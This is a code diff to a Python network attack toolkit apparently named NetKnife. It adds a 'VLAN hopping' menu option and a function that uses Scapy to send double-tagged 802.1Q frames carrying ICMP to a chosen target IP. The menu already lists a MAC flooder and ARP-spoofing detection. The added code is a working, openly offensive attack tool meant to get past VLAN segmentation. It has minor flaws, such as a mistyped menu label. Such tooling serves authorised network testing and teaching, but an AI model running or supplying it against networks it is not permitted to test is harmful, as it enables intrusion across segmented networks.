@@ -59,6 +59,7 @@ printer ("\033[91m[11]:Live IP And Device scanner")
 printer ("\033[91m[12]:Mac Flooder Tools")
 printer ("\033[91m[13]:Arp Spoofing And Arp Cache Poinsing Attack Detection Tools")
 printer ("\033[91m[99]:Exit The NetKnife")
+printer("\033[91m[14}:Vlan Hopping Attacker Tools(Double Tagging Method)")
 print Fore.GREEN + ("--------------------------------------------------------------")
 
 
@@ -460,6 +461,39 @@ def ArpAttackDetector():
 	
 
 
+	
+def VlanHopping():
+	print """
+
+	##     ##         ##     ##  #######  ########  ########  ########  #### ##    ##  ######   
+	##     ##         ##     ## ##     ## ##     ## ##     ## ##     ##  ##  ###   ## ##    ##  
+	##     ##         ##     ## ##     ## ##     ## ##     ## ##     ##  ##  ####  ## ##        
+	##     ## ####### ######### ##     ## ########  ########  ########   ##  ## ## ## ##   #### 
+ 	##   ##          ##     ## ##     ## ##        ##        ##         ##  ##  #### ##    ##  
+  	## ##           ##     ## ##     ## ##        ##        ##         ##  ##   ### ##    ##  
+   	###            ##     ##  #######  ##        ##        ##        #### ##    ##  ######   
+
+
+	"""
+	iface = raw_input("Please Enter The Interface: ")
+	PacketCount = int(input("Please Enter The Number Of Pakcet: "))
+	TargetVlan = int(input("Please Enter The Target Vlan: "))
+	CurrentVlan = int(input("Please Enter The Current Vlan: "))
+	TargetIP = raw_input("Please Enter The Target IP Address: ")
+
+	ether = Ether()
+	CurrentVlanDot1q = Dot1Q(vlan=CurrentVlan)
+	TargetVlanDot1q = Dot1Q(vlan=TargetVlan)
+	TargetIPAddress = IP(dst=TargetIP)
+	ICMP_Packet = ICMP()
+
+	Packet = ether/CurrentVlanDot1q/TargetVlanDot1q/TargetIPAddress/ICMP_Packet
+	sendp(Packet,iface=iface,count=PacketCount)
+
+
+	
+	
+	
 
 if __name__ == '__main__':
     while True:
@@ -491,6 +525,8 @@ if __name__ == '__main__':
                 MacFlooder()
 	    if TN == 13:
 		ArpAttackDetector()
+	    if TN == 14:
+		VlanHopping()
             if TN == 99:
                 break
             #else:
